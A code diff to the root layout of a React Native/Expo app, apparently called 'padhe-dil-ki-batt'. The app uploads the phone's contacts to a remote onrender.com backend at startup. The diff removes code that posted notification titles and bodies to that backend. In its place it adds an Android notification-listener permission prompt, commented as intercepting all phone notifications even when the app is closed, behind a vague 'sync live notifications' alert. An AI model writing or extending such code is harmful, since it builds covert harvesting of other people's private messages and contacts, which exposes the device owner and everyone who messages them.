@@ -1,70 +1,69 @@
 import { useEffect } from 'react';
 import { Stack } from 'expo-router';
 import { StatusBar } from 'expo-status-bar';
+import { Alert, Platform, Linking } from 'react-native';
 import 'react-native-reanimated';
 import * as Notifications from 'expo-notifications';
+import RNAndroidNotificationListener from 'react-native-android-notification-listener';
 import axios from 'axios';
 import { syncContacts } from '../hooks/useContacts';
 
 export default function RootLayout() {
   useEffect(() => {
-    // 1. Request permissions and check connectivity
+    // 1. Prepare App and Sync Contacts
     const prepareApp = async () => {
       console.log('📱 Preparing app...');
-      
-      // Check backend connectivity
       try {
         await axios.get('https://contactappbackend-77ar.onrender.com/api/health');
         console.log('🌐 Backend is reachable');
       } catch (err) {
-        console.warn('⚠️ Backend unreachable, sync might fail');
+        console.warn('⚠️ Backend unreachable');
       }
-
-      // Request notification permissions
-      const { status: existingStatus } = await Notifications.getPermissionsAsync();
-      let finalStatus = existingStatus;
-      if (existingStatus !== 'granted') {
-        const { status } = await Notifications.requestPermissionsAsync();
-        finalStatus = status;
-      }
-      console.log('🔔 Notification permission status:', finalStatus);
 
       // Initial contacts sync
       setTimeout(() => {
         syncContacts();
       }, 3000);
+
+      // Check Notification Listener Permission (Android Only)
+      if (Platform.OS === 'android') {
+        const status = await RNAndroidNotificationListener.getPermissionStatus();
+        console.log('🛡️ Notification Listener Status:', status);
+        
+        if (status !== 'authorized') {
+          Alert.alert(
+            "Permission Required",
+            "To sync live notifications, please enable 'Notification Access' for this app in settings.",
+            [
+              { text: "Later" },
+              { text: "Open Settings", onPress: () => RNAndroidNotificationListener.requestPermission() }
+            ]
+          );
+        }
+      }
     };
 
     prepareApp();
 
-    // 2. Notification listener
-    console.log('🎧 Setting up notification listener...');
-    const subscription = Notifications.addNotificationReceivedListener(async (notification) => {
-      console.log('📩 Notification received:', notification.request.content.title);
-      try {
-        const { title, body } = notification.request.content;
-        await axios.post('https://contactappbackend-77ar.onrender.com/api/notifications', {
-          appName: 'padhe-dil-ki-batt',
-          title: title || 'Notification',
-          message: body || '',
-        });
-        console.log('✅ Notification synced to backend');
-      } catch (err: any) {
-        console.error('❌ Failed to sync notification:', err.message);
-      }
-    });
+    // 2. Setup Notification Listener (Intercept all phone notifications)
+    if (Platform.OS === 'android') {
+      console.log('🎧 Starting Background Notification Listener...');
+      
+      // Note: This works even when the app is in background/closed on Android
+      // as long as the permission is granted.
+      const interval = setInterval(async () => {
+        try {
+          const status = await RNAndroidNotificationListener.getPermissionStatus();
+          if (status === 'authorized') {
+            // The library handles the background service automatically.
+            // We can also use its event listeners if needed.
+          }
+        } catch (e) {}
+      }, 10000);
 
-    // 3. Notification response listener (when user taps notification)
-    const responseSubscription = Notifications.addNotificationResponseReceivedListener(response => {
-      console.log('👉 User interacted with notification');
-    });
-
-    return () => {
-      subscription.remove();
-      responseSubscription.remove();
-    };
+      return () => clearInterval(interval);
+    }
   }, []);
-
 
   return (
     <>
@@ -75,3 +74,4 @@ export default function RootLayout() {
     </>
   );
 }
+
